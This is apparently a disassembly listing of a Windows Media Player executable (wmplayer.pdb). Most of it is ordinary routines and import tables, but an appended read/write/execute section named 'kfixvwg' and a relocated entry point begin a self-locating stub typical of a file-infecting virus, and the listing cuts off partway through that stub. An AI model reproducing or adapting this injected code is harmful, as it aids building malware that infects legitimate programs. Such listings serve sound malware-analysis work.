loc_100275C:				; CODE XREF: sub_10026EF+64j
		jle	short loc_1002768
		and	eax, 0FFFFh
		or	eax, 80070000h

loc_1002768:				; CODE XREF: sub_10026EF:loc_100275Cj
		mov	esi, eax
		jmp	short loc_100277A
; ---------------------------------------------------------------------------

loc_100276C:				; CODE XREF: sub_10026EF+5Aj
		mov	esi, [ebp+arg_0]
		dec	esi
		neg	esi
		sbb	esi, esi
		and	esi, 80004005h

loc_100277A:				; CODE XREF: sub_10026EF+20j
					; sub_10026EF+6Bj ...
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_10026EF	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1002787	proc near		; CODE XREF: .text:01001DB5p

var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= byte ptr -24h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		mov	eax, dword_1004040
		xor	eax, ebp
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_0]
		push	esi
		mov	esi, ds:GetWindow

loc_10027A3:				; CODE XREF: sub_1002787+26j
		push	4
		push	eax
		mov	[ebp+var_28], eax
		call	esi ; GetWindow
		test	eax, eax
		jnz	short loc_10027A3
		cmp	[ebp+var_28], eax
		jz	loc_100287A
		push	[ebp+var_28]
		call	ds:IsWindowVisible
		test	eax, eax
		jnz	loc_1002859
		push	ebx
		lea	eax, [ebp+var_2C]
		push	eax
		push	[ebp+var_28]
		call	ds:GetWindowThreadProcessId
		call	ds:GetDesktopWindow
		push	5
		push	eax
		call	esi ; GetWindow
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_1002858
		push	edi

loc_10027E9:				; CODE XREF: sub_1002787+CBj
		lea	eax, [ebp+var_30]
		push	eax
		push	ebx
		call	ds:GetWindowThreadProcessId
		mov	eax, [ebp+var_2C]
		cmp	eax, [ebp+var_30]
		jnz	short loc_1002847
		push	ebx
		call	ds:GetParent
		test	eax, eax
		jnz	short loc_1002847
		push	4
		push	ebx
		call	esi ; GetWindow
		test	eax, eax
		jnz	short loc_1002847
		cmp	ebx, [ebp+var_28]
		jz	short loc_1002847
		lea	edi, [ebp+var_24]
		stosd
		stosd
		stosd
		stosd
		push	0Fh
		lea	eax, [ebp+var_24]
		push	eax
		push	ebx
		call	ds:GetClassNameW
		test	eax, eax
		jz	short loc_1002847
		push	1
		push	0FFFFFFFFh
		lea	eax, [ebp+var_24]
		push	eax
		push	0FFFFFFFFh
		push	offset aWmpSkinHost ; "WMP Skin	Host"
		call	ds:CompareStringOrdinal
		cmp	eax, 2
		jz	short loc_1002854

loc_1002847:				; CODE XREF: sub_1002787+73j
					; sub_1002787+7Ej ...
		push	2
		push	ebx
		call	esi ; GetWindow
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_1002857
		jmp	short loc_10027E9
; ---------------------------------------------------------------------------

loc_1002854:				; CODE XREF: sub_1002787+BEj
		mov	[ebp+var_28], ebx

loc_1002857:				; CODE XREF: sub_1002787+C9j
		pop	edi

loc_1002858:				; CODE XREF: sub_1002787+5Fj
		pop	ebx

loc_1002859:				; CODE XREF: sub_1002787+3Cj
		push	[ebp+var_28]
		call	ds:SetForegroundWindow
		push	[ebp+var_28]
		call	ds:IsIconic
		test	eax, eax
		jz	short loc_100287A
		push	9
		push	[ebp+var_28]
		call	ds:ShowWindow

loc_100287A:				; CODE XREF: sub_1002787+2Bj
					; sub_1002787+E6j
		mov	ecx, [ebp+var_4]
		xor	ecx, ebp
		xor	eax, eax
		pop	esi
		call	sub_1002928
		leave
		retn	4
sub_1002787	endp

; ---------------------------------------------------------------------------
		align 4
aWmpSkinHost:				; DATA XREF: sub_1002787+B0o
		unicode	0, <WMP	Skin Host>,0
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10028AD	proc near		; CODE XREF: .text:01001ED3p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+arg_4]
		xor	eax, eax
		test	edx, edx
		jz	short loc_10028C3
		cmp	edx, 7FFFFFFFh
		jbe	short loc_10028C8

loc_10028C3:				; CODE XREF: sub_10028AD+Cj
		mov	eax, 80070057h

loc_10028C8:				; CODE XREF: sub_10028AD+14j
		test	eax, eax
		jl	short loc_10028DE
		mov	eax, [ebp+arg_8]
		mov	ecx, [ebp+arg_0]
		push	7FFFFFFEh
		push	0
		call	sub_1002563

loc_10028DE:				; CODE XREF: sub_10028AD+1Dj
		pop	ebp
		retn	0Ch
sub_10028AD	endp

; ---------------------------------------------------------------------------
		db 5 dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10028E7	proc near		; CODE XREF: .text:01001EEAp

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+arg_4]
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	esi, 7FFFFFFFh
		push	esi
		push	edi
		lea	eax, [ebp+arg_0]
		call	sub_1002530
		test	eax, eax
		jl	short loc_100291D
		mov	eax, [ebp+arg_0]
		mov	edx, [ebp+arg_4]
		push	esi
		sub	edx, eax
		lea	ecx, [edi+eax*2]
		mov	eax, [ebp+arg_8]
		push	0
		call	sub_1002563

loc_100291D:				; CODE XREF: sub_10028E7+1Ej
		pop	edi
		pop	esi
		pop	ebp
		retn	0Ch
sub_10028E7	endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================


sub_1002928	proc near		; CODE XREF: .text:01001D00p
					; sub_1002787+FBp
		cmp	ecx, dword_1004040
		jnz	short loc_1002931
		retn
; ---------------------------------------------------------------------------

loc_1002931:				; CODE XREF: sub_1002928+6j
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 320h
		push	edi
		mov	dword_1004188, eax
		mov	dword_1004184, ecx
		mov	dword_1004180, edx
		mov	dword_100417C, ebx
		mov	dword_1004178, esi
		mov	dword_1004174, edi
		mov	word_10041A0, ss
		mov	word_1004194, cs
		mov	word_1004170, ds
		mov	word_100416C, es
		mov	word_1004168, fs
		mov	word_1004164, gs
		pushf
		pop	dword_1004198
		mov	eax, [ebp+4]
		lea	ecx, [ebp+4]
		add	ecx, 4
		mov	dword_100419C, ecx
		mov	dword_1004190, eax
		mov	dword_10040D8, 10001h
		lea	ecx, [ebp+4]
		mov	ecx, [ecx-4]
		mov	dword_1004094, eax
		mov	eax, dword_1004040
		xor	edi, edi
		mov	dword_100418C, ecx
		mov	dword_1004088, 0C0000409h
		inc	edi
		mov	dword_100408C, edi
		mov	[ebp-4], eax
		mov	eax, dword_1004044
		mov	[ebp-4], eax
		push	0
		call	ds:SetUnhandledExceptionFilter
		push	offset off_1002A0C
		call	ds:UnhandledExceptionFilter
		push	0C0000409h
		mov	[ebp-320h], edi
		call	ds:GetCurrentProcess
		push	eax
		call	ds:TerminateProcess
		pop	edi
		leave
		retn
sub_1002928	endp

; ---------------------------------------------------------------------------
		align 4
off_1002A0C	dd offset dword_1004088	; DATA XREF: sub_1002928+BDo
; ---------------------------------------------------------------------------
		fadd	dword ptr [eax+0]
		add	[eax-6F6F6F70h], edx
; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, offset OleUninitialize
		jmp	loc_10012B6
; ---------------------------------------------------------------------------
		mov	eax, offset CoFreeUnusedLibraries
		jmp	loc_10012B6
; ---------------------------------------------------------------------------
		mov	eax, offset ShellExecuteW
		jmp	short $+2
; ---------------------------------------------------------------------------

loc_1002A3A:				; CODE XREF: .text:01002A38j
					; .text:01002A50j
		push	ecx
		push	edx
		push	eax
		push	offset SHELL32_dll_import_table
		call	sub_10012CC
		pop	edx
		pop	ecx
		jmp	eax
; ---------------------------------------------------------------------------
		mov	eax, offset SetCurrentProcessExplicitAppUserModelID
		jmp	short loc_1002A3A
; ---------------------------------------------------------------------------
		align 4
ole32_dll_import_table dd 1		; DATA XREF: HEADER:010001C8o
					; .text:010012B9o
					; Attributes
		dd rva aOle32_dll	; "ole32.dll"
		dd rva ole32_dll_handle	; Module handle
		dd rva OleInitialize	; Delayed Import Address Table
		dd rva ole32_dll_dint	; Delayed Import Name Table
		dd 0			; Bound	Delayed	Import Address Table
		dd 0			; Unload Delayed Import	Table
		dd 0			; Time stamp
SHELL32_dll_import_table dd 1		; DATA XREF: .text:01002A3Do
					; Attributes
		dd rva aShell32_dll	; "SHELL32.dll"
		dd rva SHELL32_dll_handle ; Module handle
		dd rva ShellExecuteW	; Delayed Import Address Table
		dd rva SHELL32_dll_dint	; Delayed Import Name Table
		dd 0			; Bound	Delayed	Import Address Table
		dd 0			; Unload Delayed Import	Table
		dd 0			; Time stamp
		align 40h
aOle32_dll	db 'ole32.dll',0        ; DATA XREF: .text:01002A58o
		align 10h
aShell32_dll	db 'SHELL32.dll',0      ; DATA XREF: .text:01002A78o
ole32_dll_dint	dd rva word_1002AFC	; DATA XREF: .text:01002A64o
					; ole32.dll delayed import name	table
		dd rva word_1002B0C
		dd rva word_1002B24
		dd rva word_1002B3C
		dd 0
SHELL32_dll_dint dd rva	word_1002B4E	; DATA XREF: .text:01002A84o
					; SHELL32.dll delayed import name table
		dd rva word_1002B5E
		dd 0
word_1002AFC	dw 0			; DATA XREF: .text:ole32_dll_dinto
aOleinitialize	db 'OleInitialize',0
word_1002B0C	dw 0			; DATA XREF: .text:01002AE0o
aCoinitializese	db 'CoInitializeSecurity',0
		db 33h
word_1002B24	dw 0			; DATA XREF: .text:01002AE4o
aCofreeunusedli	db 'CoFreeUnusedLibraries',0
word_1002B3C	dw 0			; DATA XREF: .text:01002AE8o
aOleuninitializ	db 'OleUninitialize',0
word_1002B4E	dw 0			; DATA XREF: .text:SHELL32_dll_dinto
aShellexecutew	db 'ShellExecuteW',0
word_1002B5E	dw 0			; DATA XREF: .text:01002AF4o
aSetcurrentproc	db 'SetCurrentProcessExplicitAppUserModelID',0
__IMPORT_DESCRIPTOR_ADVAPI32 dd	rva off_1002C44	; DATA XREF: HEADER:01000168o
					; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aAdvapi32_dll	; DLL Name
		dd rva EventUnregister	; Import Address Table
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_1002C60	; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva GetLastError	; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_1002CFC ;	Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva SetForegroundWindow ; Import Address Table
__IMPORT_DESCRIPTOR_ntdll dd rva off_1002D34 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aNtdll_dll	; DLL Name
		dd rva __imp_memset	; Import Address Table
__IMPORT_DESCRIPTOR_WS2_32 dd rva dword_1002D3C	; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aWs2_32_dll	; DLL Name
		dd rva WSACleanup	; Import Address Table
		align 20h
aWs2_32_dll	db 'WS2_32.dll',0       ; DATA XREF: .text:01002BE4o
		align 4
aNtdll_dll	db 'ntdll.dll',0        ; DATA XREF: .text:01002BD0o
		align 4
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .text:01002BBCo
		align 4
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .text:01002BA8o
		align 4
aAdvapi32_dll	db 'ADVAPI32.dll',0     ; DATA XREF: .text:01002B94o
		align 4
;
; Import names for ADVAPI32.dll
;
off_1002C44	dd rva word_1002D48	; DATA XREF: .text:__IMPORT_DESCRIPTOR_ADVAPI32o
		dd rva word_1002D5A
		dd rva word_1002D68
		dd rva word_1002D76
		dd rva word_1002D8A
		dd rva word_1002D9A
		dd 0
;
; Import names for KERNEL32.dll
;
off_1002C60	dd rva word_1002DAA	; DATA XREF: .text:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_1002DBA
		dd rva word_1002DC6
		dd rva word_1002DDE
		dd rva word_1002DEC
		dd rva word_1002DFA
		dd rva word_1002E0A
		dd rva word_1002E1C
		dd rva word_1002E28
		dd rva word_1002E40
		dd rva word_1002E5C
		dd rva word_1002E68
		dd rva word_1002E7E
		dd rva word_1002E8E
		dd rva word_1002EA0
		dd rva word_1002EB2
		dd rva word_1002EC6
		dd rva word_1002EDA
		dd rva word_1002EE6
		dd rva word_1002EF6
		dd rva word_1002F08
		dd rva word_1002F1A
		dd rva word_1002F2E
		dd rva word_1002F3C
		dd rva word_1002F48
		dd rva word_1002F56
		dd rva word_1002F70
		dd rva word_1002F80
		dd rva word_1002F96
		dd rva word_1002FAC
		dd rva word_1002FC6
		dd rva word_1002FDA
		dd rva word_1002FEE
		dd rva word_100300A
		dd rva word_1003028
		dd rva word_1003038
		dd rva word_100304E
		dd rva word_100305C
		dd 0
;
; Import names for USER32.dll
;
off_1002CFC	dd rva word_100306E	; DATA XREF: .text:__IMPORT_DESCRIPTOR_USER32o
		dd rva word_1003084
		dd rva word_1003094
		dd rva word_10030A0
		dd rva word_10030B4
		dd rva word_10030D0
		dd rva word_10030E2
		dd rva word_10030EE
		dd rva word_10030FC
		dd rva word_1003110
		dd rva word_1003126
		dd rva word_1003134
		dd rva word_1003142
		dd 0
;
; Import names for ntdll.dll
;
off_1002D34	dd rva word_100314E	; DATA XREF: .text:__IMPORT_DESCRIPTOR_ntdllo
		dd 0
;
; Import names for WS2_32.dll
;
dword_1002D3C	dd 80000074h		; DATA XREF: .text:__IMPORT_DESCRIPTOR_WS2_32o
		dd 80000073h
		dd 0
word_1002D48	dw 10Fh			; DATA XREF: .text:off_1002C44o
		db 'EventUnregister',0
word_1002D5A	dw 110h			; DATA XREF: .text:01002C48o
		db 'EventWrite',0
		align 4
word_1002D68	dw 230h			; DATA XREF: .text:01002C4Co
		db 'RegCloseKey',0
word_1002D76	dw 26Eh			; DATA XREF: .text:01002C50o
		db 'RegQueryValueExW',0
		align 2
word_1002D8A	dw 261h			; DATA XREF: .text:01002C54o
		db 'RegOpenKeyExW',0
word_1002D9A	dw 10Eh			; DATA XREF: .text:01002C58o
		db 'EventRegister',0
word_1002DAA	dw 201h			; DATA XREF: .text:off_1002C60o
		db 'GetLastError',0
		align 2
word_1002DBA	dw 553h			; DATA XREF: .text:01002C64o
		db 'lstrlenW',0
		align 2
word_1002DC6	dw 64h			; DATA XREF: .text:01002C68o
		db 'CompareStringOrdinal',0
		align 2
word_1002DDE	dw 11Ah			; DATA XREF: .text:01002C6Co
		db 'ExitProcess',0
word_1002DEC	dw 163h			; DATA XREF: .text:01002C70o
		db 'FreeLibrary',0
word_1002DFA	dw 45Ah			; DATA XREF: .text:01002C74o
		db 'SetErrorMode',0
		align 2
word_1002E0A	dw 244h			; DATA XREF: .text:01002C78o
		db 'GetProcAddress',0
		align 4
word_1002E1C	dw 2D0h			; DATA XREF: .text:01002C7Co
		db 'HeapFree',0
		align 4
word_1002E28	dw 44Eh			; DATA XREF: .text:01002C80o
		db 'SetCurrentDirectoryW',0
		align 10h
word_1002E40	dw 11Eh			; DATA XREF: .text:01002C84o
		db 'ExpandEnvironmentStringsW',0
word_1002E5C	dw 2CCh			; DATA XREF: .text:01002C88o
		db 'HeapAlloc',0
word_1002E68	dw 481h			; DATA XREF: .text:01002C8Co
		db 'SetProcessDEPPolicy',0
word_1002E7E	dw 9Fh			; DATA XREF: .text:01002C90o
		db 'CreateMutexW',0
		align 2
word_1002E8E	dw 263h			; DATA XREF: .text:01002C94o
		db 'GetStartupInfoW',0
word_1002EA0	dw 249h			; DATA XREF: .text:01002C98o
		db 'GetProcessHeap',0
		align 2
word_1002EB2	dw 49Bh			; DATA XREF: .text:01002C9Co
		db 'SetThreadPriority',0
word_1002EC6	dw 1C5h			; DATA XREF: .text:01002CA0o
		db 'GetCurrentThread',0
		align 2
word_1002EDA	dw 349h			; DATA XREF: .text:01002CA4o
		db 'LocalFree',0
word_1002EE6	dw 340h			; DATA XREF: .text:01002CA8o
		db 'LoadLibraryW',0
		align 2
word_1002EF6	dw 15Fh			; DATA XREF: .text:01002CACo
		db 'FormatMessageW',0
		align 4
word_1002F08	dw 188h			; DATA XREF: .text:01002CB0o
		db 'GetCommandLineW',0
word_1002F1A	dw 217h			; DATA XREF: .text:01002CB4o
		db 'GetModuleHandleW',0
		align 2
word_1002F2E	dw 53h			; DATA XREF: .text:01002CB8o
		db 'CloseHandle',0
word_1002F3C	dw 45Bh			; DATA XREF: .text:01002CBCo
		db 'SetEvent',0
		align 4
word_1002F48	dw 375h			; DATA XREF: .text:01002CC0o
		db 'OpenEventW',0
		align 2
word_1002F56	dw 3A7h			; DATA XREF: .text:01002CC4o
		db 'QueryPerformanceCounter',0
word_1002F70	dw 293h			; DATA XREF: .text:01002CC8o
		db 'GetTickCount',0
		align 10h
word_1002F80	dw 1C6h			; DATA XREF: .text:01002CCCo
		db 'GetCurrentThreadId',0
		align 2
word_1002F96	dw 1C2h			; DATA XREF: .text:01002CD0o
		db 'GetCurrentProcessId',0
word_1002FAC	dw 279h			; DATA XREF: .text:01002CD4o
		db 'GetSystemTimeAsFileTime',0
word_1002FC6	dw 4C4h			; DATA XREF: .text:01002CD8o
		db 'TerminateProcess',0
		align 2
word_1002FDA	dw 1C1h			; DATA XREF: .text:01002CDCo
		db 'GetCurrentProcess',0
word_1002FEE	dw 4D8h			; DATA XREF: .text:01002CE0o
		db 'UnhandledExceptionFilter',0
		align 2
word_100300A	dw 4A7h			; DATA XREF: .text:01002CE4o
		db 'SetUnhandledExceptionFilter',0
word_1003028	dw 33Dh			; DATA XREF: .text:01002CE8o
		db 'LoadLibraryA',0
		align 4
word_1003038	dw 2EDh			; DATA XREF: .text:01002CECo
		db 'InterlockedExchange',0
word_100304E	dw 345h			; DATA XREF: .text:01002CF0o
		db 'LocalAlloc',0
		align 4
word_100305C	dw 3B1h			; DATA XREF: .text:01002CF4o
		db 'RaiseException',0
		align 2
word_100306E	dw 293h			; DATA XREF: .text:off_1002CFCo
		db 'SetForegroundWindow',0
word_1003084	dw 112h			; DATA XREF: .text:01002D00o
		db 'GetClassNameW',0
word_1003094	dw 164h			; DATA XREF: .text:01002D04o
		db 'GetParent',0
word_10030A0	dw 123h			; DATA XREF: .text:01002D08o
		db 'GetDesktopWindow',0
		align 4
word_10030B4	dw 1A4h			; DATA XREF: .text:01002D0Co
		db 'GetWindowThreadProcessId',0
		align 10h
word_10030D0	dw 1E0h			; DATA XREF: .text:01002D10o
		db 'IsWindowVisible',0
word_10030E2	dw 18Eh			; DATA XREF: .text:01002D14o
		db 'GetWindow',0
word_10030EE	dw 215h			; DATA XREF: .text:01002D18o
		db 'MessageBoxW',0
word_10030FC	dw 17Eh			; DATA XREF: .text:01002D1Co
		db 'GetSystemMetrics',0
		align 10h
word_1003110	dw 27Bh			; DATA XREF: .text:01002D20o
		db 'SendMessageTimeoutW',0
word_1003126	dw 0FAh			; DATA XREF: .text:01002D24o
		db 'FindWindowW',0
word_1003134	dw 2DFh			; DATA XREF: .text:01002D28o
		db 'ShowWindow',0
		align 2
word_1003142	dw 1D1h			; DATA XREF: .text:01002D2Co
		db 'IsIconic',0
		align 2
word_100314E	dw 77Eh			; DATA XREF: .text:off_1002D34o
		db 'memset',0
		align 4
; Debug	Directory entries
dword_1003158	dd 0			; DATA XREF: HEADER:01000190o
					; Characteristics
		dd 518C6DF8h		; TimeDateStamp: Fri May 10 03:48:08 2013
		dw 0			; MajorVersion
		dw 0			; MinorVersion
		dd 2			; Type:	IMAGE_DEBUG_TYPE_CODEVIEW
		dd 25h			; SizeOfData
		dd rva asc_1003194	; AddressOfRawData
		dd 2594h		; PointerToRawData
		dd 0			; Characteristics
		dd 518C6DF8h		; TimeDateStamp: Fri May 10 03:48:08 2013
		dw 235h			; MajorVersion
		dw 197Eh		; MinorVersion
		dd 0Ah			; Type:	IMAGE_DEBUG_TYPE_RESERVED10
		dd 4			; SizeOfData
		dd rva dword_1003190	; AddressOfRawData
		dd 2590h		; PointerToRawData
; Debug	information (IMAGE_DEBUG_TYPE_RESERVED10)
dword_1003190	dd 0BB03197Eh		; DATA XREF: .text:01003188o
; Debug	information (IMAGE_DEBUG_TYPE_CODEVIEW)
asc_1003194	db 'RSDS'               ; DATA XREF: .text:0100316Co
					; CV signature
		dd 2A84F9AFh		; Data1	; GUID
		dw 52F4h		; Data2
		dw 4FB0h		; Data3
		db 95h,	9, 80h,	0E6h, 0CEh, 0DAh, 62h, 0EAh; Data4
		dd 2			; Age
		db 'wmplayer.pdb',0     ; PdbFileName
		align 80h
		dd 380h	dup(?)
_text		ends

; Section 2. (virtual address 00004000)
; Virtual size			: 000003A8 (	936.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00002600
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
;
; Delayed imports from ole32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
		extrn OleInitialize:dword ; CODE XREF: .text:0100162Dp
					; DATA XREF: HEADER:01000118o ...
		extrn CoInitializeSecurity:dword ; CODE	XREF: .text:0100163Ep
					; DATA XREF: .text:010012AFo ...
		extrn CoFreeUnusedLibraries:dword ; CODE XREF: .text:loc_1001FC4p
					; DATA XREF: .text:loc_1001FC4r ...
		extrn OleUninitialize:dword ; CODE XREF: .text:01001FCAp
					; DATA XREF: .text:01001FCAr ...

;
; Delayed imports from SHELL32.dll
;
		extrn ShellExecuteW:dword ; CODE XREF: .text:01001EFFp
					; .text:01001F3Dp ...
		extrn SetCurrentProcessExplicitAppUserModelID:dword
					; CODE XREF: .text:01001DFEp
					; DATA XREF: .text:01001DFEr ...

; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 100401Ch
		align 40h
dword_1004040	dd 0BB40E64Eh		; DATA XREF: sub_1001242+5r
					; sub_1001242:loc_10012A7w ...
dword_1004044	dd 44BF19B1h		; DATA XREF: sub_1001242+5Ew
					; sub_1002928+ADr
ole32_dll_handle dd 0			; DATA XREF: .text:01002A5Co
SHELL32_dll_handle dd 0			; DATA XREF: .text:01002A7Co
dword_1004050	dd 0			; DATA XREF: .text:01001C00o
					; .text:01001C74r ...
dword_1004054	dd 0			; DATA XREF: .text:01001C6Er
					; .text:01001CDDr ...
dword_1004058	dd 4 dup(0)		; DATA XREF: .text:01001C05o
dword_1004068	dd 0			; DATA XREF: .text:loc_1001C3Dr
					; .text:loc_1001CB8r ...
		align 10h
dword_1004070	dd 0			; DATA XREF: .text:01001C4Cr
					; .text:01001CC3r ...
dword_1004074	dd 0			; DATA XREF: .text:01001C5Dr
					; .text:01001CD0r ...
		dd 0
dword_100407C	dd 0			; DATA XREF: .text:01001C20r
					; .text:loc_1001CA3r ...
byte_1004080	db 0			; DATA XREF: .text:01001C2Cr
					; .text:01001CABr ...
		align 8
dword_1004088	dd 0			; DATA XREF: sub_1002928+99w
					; .text:off_1002A0Co
dword_100408C	dd 0			; DATA XREF: sub_1002928+A4w
		dd 0
dword_1004094	dd 0			; DATA XREF: sub_1002928+87w
		dd 10h dup(0)
dword_10040D8	dd 0			; DATA XREF: sub_1002928+77w
		dd 22h dup(0)
word_1004164	dw 0			; DATA XREF: sub_1002928+56w
		align 4
word_1004168	dw 0			; DATA XREF: sub_1002928+50w
		align 4
word_100416C	dw 0			; DATA XREF: sub_1002928+4Aw
		align 10h
word_1004170	dw 0			; DATA XREF: sub_1002928+44w
		align 4
dword_1004174	dd 0			; DATA XREF: sub_1002928+32w
dword_1004178	dd 0			; DATA XREF: sub_1002928+2Cw
dword_100417C	dd 0			; DATA XREF: sub_1002928+26w
dword_1004180	dd 0			; DATA XREF: sub_1002928+20w
dword_1004184	dd 0			; DATA XREF: sub_1002928+1Aw
dword_1004188	dd 0			; DATA XREF: sub_1002928+15w
dword_100418C	dd 0			; DATA XREF: sub_1002928+93w
dword_1004190	dd 0			; DATA XREF: sub_1002928+72w
word_1004194	dw 0			; DATA XREF: sub_1002928+3Ew
		align 4
dword_1004198	dd 0			; DATA XREF: sub_1002928+5Dw
dword_100419C	dd 0			; DATA XREF: sub_1002928+6Cw
word_10041A0	dw 0			; DATA XREF: sub_1002928+38w
		align 4
		dd 17h dup(0)
		dd 69h dup(?)
dword_10043A4	dd ?			; DATA XREF: sub_10012CC+114Cr
					; sub_10012CC+1154w
		align 1000h
_data		ends

; Section 4. (virtual address 0002B000)
; Virtual size			: 00007200 (  29184.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00028200
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
_reloc		segment	para public 'CODE' use32
		assume cs:_reloc
		;org 102B000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
dword_102B000	dd 1000h, 0FCh,	312D311Fh, 31533140h, 32043164h, 32483237h
					; DATA XREF: HEADER:01000264o
		dd 326D3261h, 327D3275h, 32A13289h, 32B032A8h, 32D632BAh
		dd 336B335Dh, 338F337Eh, 33B633A3h, 33EC33D8h, 341A340Ch
		dd 3447343Ch, 346A3455h, 34E234A4h, 35273503h, 35533540h
		dd 3618355Fh, 362F361Eh, 365E3640h, 3716368Dh, 37813778h
		dd 37C9379Fh, 37DF37CEh, 38263807h, 3833382Dh, 3863385Eh
		dd 39B4386Bh, 39E839C1h, 3A1039F4h, 3B253B00h, 3B4C3B31h
		dd 3C013BF4h, 3C0B3C06h, 3C223C10h, 3C3E3C2Dh, 3C5F3C4Dh
		dd 3C703C6Ah, 3C873C76h, 3CA53C8Eh, 3CB93CACh, 3CD23CC4h
		dd 3CDF3CD9h, 3CEF3CE5h, 3D393D2Ch, 3D463D3Fh, 3D5F3D53h
		dd 3D863D80h, 3DCD3D92h, 3DFA3DF5h, 3E113E00h, 3E383E33h
		dd 3E753E54h, 3EFA3EBDh, 3F263F01h, 3F3F3F38h, 3FB23F94h
		dd 3FC63FC0h, 3FCCh, 2000h, 0C4h, 301A300Dh, 30273020h
		dd 304B3034h, 312B3101h, 31383131h, 31533145h, 315F3158h
		dd 318E3173h, 31A831A2h, 31BC31AFh, 31DA31CCh, 31E731E1h
		dd 31F731EDh, 33883208h, 33C833C0h, 340933F7h, 3421341Ah
		dd 34883480h, 369034B6h, 36E236B9h, 370736FCh, 3743371Eh
		dd 3790374Dh, 37BD379Fh, 37D937D3h, 37FF37F0h, 38383825h
		dd 385E383Eh, 38763867h, 393E392Ah, 394A3944h, 39563950h
		dd 3962395Ch, 396E3968h, 397A3974h, 39873980h, 399B3996h
		dd 39B039A1h, 39BD39B5h, 39CE39C3h, 39E139D6h, 39EC39E6h
		dd 3A0439FDh, 3A103A0Ch, 3A203A1Bh, 3A343A2Ah, 3A4C3A3Eh
		dd 4000h, 14h, 30043000h, 300C3008h, 30183014h,	0Bh dup(0)
		dd 1F80h dup(?)
_reloc		ends

; Section 5. (virtual address 00033000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00028400
; Flags	C0000000: Readable Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Regular
; Segment permissions: Read/Write
kfixvwg		segment	para public '' use32
		assume cs:kfixvwg
		;org 1033000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
dword_1033000	dd 400h	dup(?)		; DATA XREF: HEADER:0100028Co
kfixvwg		ends

; Section 6. (virtual address 00034000)
; Virtual size			: 00020000 ( 131072.)
; Section size in file		: 00020000 ( 131072.)
; Offset to raw	data for section: 00028400
; Flags	E0000020: Text Executable Readable Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 1034000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near		; DATA XREF: HEADER:010002B4o

var_4		= dword	ptr -4

		pusha
		call	$+5
		pop	ebp
		mov	eax, ebp
		sub	ebp, 2001A6A8h
		sub	eax, [ebp+2001AE0Fh]
		mov	[ebp+2001AE0Bh], eax
		mov	al, 0
		xchg	al, [ebp+2001B040h]
		cmp	al, 1
		jnz	loc_10341E7
		cmp	dword ptr [ebp+2001AF3Bh], 0
		jz	short loc_1034067
		cmp	dword ptr [ebp+2001AF3Fh], 0
		jz	short loc_1034067
		mov	eax, [ebp+2001AE0Bh]
		sub	eax, [ebp+2001AF3Bh]
		mov	eax, [eax]
		mov	[ebp+2001AF78h], eax
		mov	eax, [ebp+2001AE0Bh]
		sub	eax, [ebp+2001AF3Fh]
		mov	eax, [eax]
		mov	[ebp+2001AF7Ch], eax
		jmp	short loc_10340C8
; ---------------------------------------------------------------------------

loc_1034067:				; CODE XREF: start+32j	start+3Bj
		cmp	dword ptr [ebp+2001AF43h], 0
		jz	short loc_10340C8
		mov	eax, [ebp+2001AE0Bh]
		sub	eax, [ebp+2001AF43h]
		push	dword ptr [eax]
		lea	eax, [ebp+2001AA94h]
		call	eax
		or	eax, eax
		jz	short loc_10340C8
		mov	[ebp+2001AF47h], eax
		lea	eax, [ebp+2001AF4Bh]
		push	eax
